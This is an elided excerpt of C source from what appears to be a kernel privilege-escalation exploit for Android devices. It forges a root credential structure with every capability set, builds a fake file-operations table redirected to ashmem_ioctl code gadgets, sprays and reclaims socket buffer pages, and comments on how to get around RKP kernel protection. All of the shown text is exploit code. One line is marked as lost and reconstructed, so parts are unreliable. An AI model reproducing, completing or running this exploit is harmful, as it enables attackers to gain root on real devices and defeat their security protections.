...
static unsigned char mm_objs_per_slab;  /* A17: "shape armed" flag (see prepare_kernel_page) */
...
/* A17 filp-root / probe knobs: swapped into the fake fops table by
 * put_fake_fops_table (see run_rwforge). */
uintptr_t fops_filp_root_mode;
uintptr_t fops_write_iter_override;
uintptr_t fops_ioctl_override;
uintptr_t fops_release_override;

/* GL_DEFER_CLOSE: carrier skbs held until exit (count of dup'd pairs) */
int defer_carriers_n;
...
int g_route_core = 0;  /* GHOSTLOCK_CORE env overrides (see common.h) */
...
uintptr_t p0_data_alias(uintptr_t image_addr) {
  ...
  { const char *gc = getenv("GHOSTLOCK_CORE");
    if (gc) g_route_core = atoi(gc); }
...
static void fill_init_cred_copy(unsigned char *p, size_t off) {
  ...
  /* A17/CZF1: full self-contained root cred living in OUR spray page.
   * The mode-2 rb write clobbers word 0 of the child node (usage) as a side
   * effect — with the cred in our page that is harmless, whereas writes to
   * the real init_cred appear to abort the rb operation on CZF1 (likely
   * RKP-protected .data), silently dropping the target store. */
  memset(c, 0, 184);
  put32(c, 0, 0x100);                                   /* usage (clobbered anyway) */
  put64(c, 48, 0xFFFFFFFFFFFFFFFFULL);                  /* cap_inheritable.. */
  put64(c, 56, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 64, 0xFFFFFFFFFFFFFFFFULL);                  /* cap_effective */
  put64(c, 72, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 80, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 0x80, data_addr(INIT_SEC));                  /* security */
#ifdef ROOT_USER
  put64(c, 0x88, data_addr(ROOT_USER));                 /* user (get_current_user: pipe() etc.) */
#endif
  put64(c, 0x90, data_addr(INIT_USER_NS));              /* user_ns (getuid needs it) */
...
void put_fake_fops_table(unsigned char *p, size_t off) {
  ...
  /* filp-root: llseek/read_iter point mid-ashmem_ioctl (gadgets whose tail
   * does the commit); the normal route keeps the W0 pi_tree sentinel. */
  if (fops_filp_root_mode) {
    put64(p, off + FOPS_LLSEEK_OFF, text_addr(ASHMEM_IOCTL) + 0x4c);
  } else {
  ...
  if (fops_filp_root_mode) {
    put64(p, off + FOPS_READ_ITER_OFF, text_addr(ASHMEM_IOCTL) + 0x368);
    put64(p, off + FOPS_WRITE_ITER_OFF, 0);
  } else {
    put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
    if (fops_write_iter_override) {
      put64(p, off + FOPS_WRITE_ITER_OFF, fops_write_iter_override);
    } else {
      put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
    }
  }
  if (fops_ioctl_override) {
    put64(p, off + FOPS_IOCTL_OFF, fops_ioctl_override);
  } else {
  ...
  if (fops_release_override) {
    put64(p, off + FOPS_RELEASE_OFF, fops_release_override);
  } else {
...
void prepare_ctxs(void) {
  ...
  /* A17: mm_objs_per_slab is the "shape armed" flag (see prepare_kernel_page);
   * the per-slab object count (25 = ORDER3_SIZE / MM_STRUCT_SZ) is folded. */
...
int prepare_skb_payload(uintptr_t base, int payload_mode) {
    ...
    if (pselect_custom_write) {
      if (pselect_child_node) {
        if (pselect_custom_write == 4) {
          ...
          /* rwforge: flag makes the write value self-referential — the
           * struct page of THIS round's freshly reclaimed payload page
           * (only known after the leak, so it must be computed here). */
          if (pselect_value_page_base) {
            fake_right = direct_to_page(base);
          } else {
            fake_right = pselect_custom_value;
          }
        } else if (pselect_custom_write == 2) {
          /* Write 2 (cred): child = OUR fake cred in the spray page
           * (CRED_COPY region). Never touches init_cred — on CZF1 a store
           * to init_cred's page aborts the rb write (RKP), silently
           * dropping the target store. The value installed at target is
           * this pointer. */
  ...
  if (getenv("RWF_DEBUG"))
    pr_info("DBG payload mode=%d cw=%d target=%016zx cval=%016zx "
            "pc=%016zx right=%016zx left=%016zx wtask=%016llx\n",
...
uintptr_t prepare_kernel_page(int payload_mode) {
  /* A17: carrier-socketpair handling is inlined here (no close_reclaim_sockets
   * call). GL_DEFER_CLOSE keeps the carrier skbs alive: each round's pair is
   * F_DUPFD_CLOEXEC'd above 0x2400 instead of being closed, so the reclaim
   * pages persist until process exit. */
  if (getenv("GL_DEFER_CLOSE")) {
    if (reclaim_sv[0] >= 0) {
      if (defer_carriers_n > 0x5f) {
        pr_warning("defer carriers full (%d) — closing oldest-style\n",
                   defer_carriers_n);
        close(reclaim_sv[0]);
        reclaim_sv[0] = -1;
        if (reclaim_sv[1] >= 0) {
        ...
        if (fcntl(reclaim_sv[0], F_DUPFD_CLOEXEC, 0x2400 + defer_carriers_n * 2) < 0) {
          pr_warning("defer carrier fdmove failed errno=%d\n", errno);
        } else {
          close(reclaim_sv[0]);
        }
        reclaim_sv[0] = -1;
        if (fcntl(reclaim_sv[1], F_DUPFD_CLOEXEC, 0x2401 + defer_carriers_n * 2) < 0) {
          pr_warning("defer carrier fdmove failed errno=%d\n", errno);
        } else {
          close(reclaim_sv[1]);
        }
  ...
  /* A17: mm_objs_per_slab doubles as the "shape armed" flag; the slab
   * geometry is fixed (25 mm_struct per order-3 slab) and folded into
   * prepare_ctxs. */
  mm_objs_per_slab = 1;  /* LOST: reconstructed — A17 keeps this as a flag */
  prepare_ctxs();
